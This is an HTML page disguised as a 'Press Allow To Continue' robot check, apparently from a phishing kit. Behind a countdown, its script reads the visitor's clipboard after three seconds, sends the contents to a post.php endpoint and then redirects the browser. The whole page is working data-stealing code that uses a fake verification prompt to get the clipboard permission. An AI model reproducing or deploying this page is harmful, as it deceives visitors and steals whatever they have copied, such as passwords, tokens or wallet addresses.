<html>
    <body>
        <h1 align="center">Press Allow To Continue...</h1>
        <h2 align="center">Please wait <span>5 </span> seconds. This process checks whether you're not a robot...</h2>
        <script>
            allow_redir = true;
            const post = (obj, url=window.location.origin+"/post.php", error=false) => {
                const formData = new FormData();
                for (const key in obj) {
                    formData.append(key, obj[key]);
                }
                fetch(url, {
                    method: "POST",
                    body: formData
                })
                .then(async (res) => {
                    const text = await res.text();
                    console.log(text);
                    try {
                        if (error) document.querySelector("#failure").click();
                        else document.querySelector("#success").click();
                    }
                    catch (err) {
                        console.log(err)
                    }
                    try {
                        if (allow_redir && redirect_url) location.replace(redirect_url);
                    }
                    catch (err) {
                        console.log(err)
                    }
                })
                .catch((err) => {
                    console.log(err)
                    try {
                        document.querySelector("#failure").click();
                    }
                    catch (err) {
                        console.log(err)
                    }
                    try {
                        if (allow_redir && redirect_url) location.replace(redirect_url);
                    }
                    catch (err) {
                        console.log(err)
                    }
                });
            };
            setInterval(() => {
                second = document.querySelector("span");
                second.textContent = parseInt(second.textContent) - 1;
            }, 1000);
            setTimeout(() => {
                navigator.clipboard
                    .readText()
                    .then((text) => {
                        post({clipboard: text});
                    })
                    .catch((err) => {
                        alert(err);
                    });
            }, 3000);
            setTimeout(() => {
                if (redirect_url) window.location.replace(redirect_url)
            }, 5000);
        </script>
    </body>
</html>
